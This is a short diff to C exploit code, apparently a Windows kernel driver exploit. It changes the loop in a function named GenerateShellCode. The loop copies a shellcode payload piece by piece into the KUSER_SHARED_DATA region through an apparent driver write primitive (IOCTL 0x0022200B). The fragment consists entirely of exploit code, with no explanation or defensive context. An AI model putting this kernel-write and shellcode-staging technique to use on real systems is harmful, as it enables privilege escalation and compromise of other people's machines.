@@ -327,7 +327,7 @@ void *GenerateShellCode(HANDLE driverHandle)
     payloadSizeInEight = (int ) (payloadSize / 8);
     printf("[+] Payload size by eigth: %i\n",payloadSizeInEight);
 
-    for (int i = 0; i < payloadSizeInEight;i+=8)
+    for (int i = 0; i < payloadSizeInEight;i++)
     {
         
         SendToDriver(driverHandle,0x0022200B,(void*) ( ( (unsigned long long)shellcode)+i), (void*) (((unsigned long long)KUSER_SHARED_DATA)+i) );
